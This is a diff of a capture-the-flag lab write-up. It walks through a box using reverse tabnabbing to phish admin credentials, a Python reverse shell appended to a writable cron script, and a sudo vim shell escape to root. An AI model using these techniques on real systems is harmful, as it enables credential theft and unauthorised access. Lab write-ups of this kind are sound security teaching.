@@ -47,21 +47,21 @@ Not a whole lot we can do with that version of SSH without credentials, so I fir
 
 Checking out the landing page shows a typical login panel. Attempting to use default credentials such as `admin:admin` doesn't work and it seems that verbose errors are also disabled, so we can't enumerate users this way.
 
-![](../assets/img/2026-03-01-Napping/1.png)
+![](/assets/img/2026-03-01-Napping/1.png)
 
 We are allowed to register as a user on the page which I go ahead and do to have a look around the site internally. This gives us a few things right off the bat, our username is reflected to the page, we have a reset password function to play around with, and finally a field to submit URLs for an admin to review.
 
-![](../assets/img/2026-03-01-Napping/2.png)
+![](/assets/img/2026-03-01-Napping/2.png)
 
 Checking out how the site keeps track of our login reveals a normal cookie named `PHPSESSID` that luckily has the HttpOnly flag set to false. It's pretty obvious that we'll have to perform some type of Cross-Site Scripting attack to hijack an admin session, but I want to rule out some other possibilities for fun.
 
 As our username is reflected to the page, if we're allowed to supply special characters whilst registering, it could mean some kind of SSTI or means of XSS if anyone were to visit a page including it. Unfortunately, both the login and registration pages sanitize all special characters, meaning that SQL Injection and the aforementioned attacks won't work here.
 
-![](../assets/img/2026-03-01-Napping/3.png)
+![](/assets/img/2026-03-01-Napping/3.png)
 
 Next up is the reset password function. Capturing a request to that endpoint shows that no data is being sent over the network which means that it probably uses our cookie to find which user we are. To the best of my knowledge, this isn't vulnerable to anything for now, but if we were to get another users session it may be possible to reset their password.
 
-![](../assets/img/2026-03-01-Napping/4.png)
+![](/assets/img/2026-03-01-Napping/4.png)
 
 Lastly is the field for inputting our URLs at. At first, I tried a simple XSS payload that would send the admin to our own web server and document their cookie to hijack their session.
 
@@ -76,11 +76,11 @@ A few attempts later using similar payloads as well as ones bypassing potential 
 ## Reverse Tabnabbing to Grab Credentials
 Checking the source code after viewing what we supplied as the URL shows something interesting. Along with our site, I discover the target attribute appended which is used to open the link in a new tab.
 
-![](../assets/img/2026-03-01-Napping/5.png)
+![](/assets/img/2026-03-01-Napping/5.png)
 
 I wasn't too sure how to go about exploiting this, so I hopped over to Google in order to research common vulnerabilities that arise when this attribute is in use. This rewards me with a result that looks very similar to what's happening on the target site.
 
-![](../assets/img/2026-03-01-Napping/6.png)
+![](/assets/img/2026-03-01-Napping/6.png)
 
 Reverse Tabnabbing is a type of phishing attack that takes advantage of how modern browsers handle links opened in new tabs. When a website uses the `target='_blank'` attribute, the linked page opens in a new tab, but it also retains a reference back to the original page through the browser's `window.opener` object. 
 
@@ -144,19 +144,19 @@ After copy/pasting that to a local file called `login.html`, we'll also need ano
 
 Finally, we host them on our machine using something like a Python web server and wait for the admin load it. Since we didn't use any code to display it neatly, we'll need to inspect the POST request made to `login.html` in order to find valid credentials.
 
-![](../assets/img/2026-03-01-Napping/7.png)
+![](/assets/img/2026-03-01-Napping/7.png)
 
 Waiting a moment rewards us with a plaintext password for Daniel's account which also works over SSH to grab a shell on the system. 
 
 ## Privilege Escalation
 At this point, we can focus on looking at routes to escalate privileges. Some light enumeration shows another user on the box named Adrian and that we have access to write to one his scripts since we're apart of the administrators group.
 
-![](../assets/img/2026-03-01-Napping/8.png)
+![](/assets/img/2026-03-01-Napping/8.png)
 
 ### Command Injection in Script
 Taking a look at the script shows that it just logs the status of the site to another text file within his home directory.
 
-![](../assets/img/2026-03-01-Napping/9.png)
+![](/assets/img/2026-03-01-Napping/9.png)
 
 Judging by the output, this is being executed every minute by a cronjob or automated process. Since we have write permissions to it, we can simply append a python reverse shell towards our box to pivot users and grab a shell as Adrian.
 
@@ -167,10 +167,10 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ### Sudo Misconfiguration
 At this point we can grab the user flag under his home directory and begin the search for something to leverage in order to pop a root shell.
 
-![](../assets/img/2026-03-01-Napping/10.png)
+![](/assets/img/2026-03-01-Napping/10.png)
 
 Listing Sudo privileges shows that Adrian can run the vim binary as root user without a password. This means that we can literally choose which file to edit/read and steal contents from it, however we can also just spawn a root shell by use of the binary's ability to spawn an interactive shell inside of the terminal. To do so, we just need to enter a vim terminal while running Sudo and enter `:!/bin/bash` which will escalate our privileges to whomever the process is ran as (root).
 
-![](../assets/img/2026-03-01-Napping/11.png)
+![](/assets/img/2026-03-01-Napping/11.png)
 
 Finally grabbing the root flag under `/root` directory completes this challenge. Overall, I really liked this box because the web portion was a particularly unique exploit. I hope this was helpful to anyone following along or stuck and happy hacking!
